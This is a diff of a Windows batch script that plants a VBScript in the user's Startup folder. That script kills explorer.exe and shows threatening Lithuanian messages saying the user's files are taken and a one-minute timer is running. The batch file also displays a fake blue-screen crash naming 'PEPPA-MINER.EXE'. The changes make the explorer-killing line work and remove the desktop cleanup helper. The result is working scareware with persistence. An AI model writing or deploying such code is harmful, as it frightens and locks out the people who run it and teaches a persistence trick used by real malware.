@@ -1,7 +1,7 @@
 @echo off
 echo Set x = CreateObject("Wscript.Shell") > "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
 echo. >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
-echo x.run"taskkill /f /im explorer.exe"
+echo x.run"taskkill /f /im explorer.exe" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
 echo. >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
 echo MsgBox"CRITICAL ERROR " >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
 echo MsgBox"Pizda tu duhas dabar pas mane tavo failai! Taimeris nustatitas ant 1min jeigu neirasysi koduka bus labai blogai :)" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
@@ -36,10 +36,8 @@ echo MsgBox"Go dar viena karta?" >> "%AppData%\Microsoft\Windows\Start Menu\Prog
 echo MsgBox"Nu kaip nori..." >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
 
 echo x.run"explorer.exe" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo x.run"cmd.exe /k del %AppData%\Microsoft\Windows\Start Menu\Programs\Startup\ecrypt_window.vbs" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
 
-echo @echo off >> "%HomePath%\Desktop\decrypt.cmd"
-
-echo del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\ecrypt_window.vbs" >> "%HomePath%\Desktop\decrypt.cmd"
 
 
 :VBSDynamicBuild
@@ -54,14 +52,17 @@ CSCRIPT //nologo "%TempVBSFile%"
 
 cls
 color 17
-
-echo          A problem has been detected and Windows has been shut down to prevent damage
+echo 	      CRITICAL WINDOWS ERROR ALERT!
+echo.
+echo.
+echo          A problem has been detected and Windows Will shut down to prevent damage
 
 echo          to your computer.
 
 echo.
+echo.
 
-echo          The problem seems to be caused by the following file: SPCMDCON.SYS
+echo          The problem seems to be caused by the following file: PEPPA-MINER.EXE
 
 echo.
 
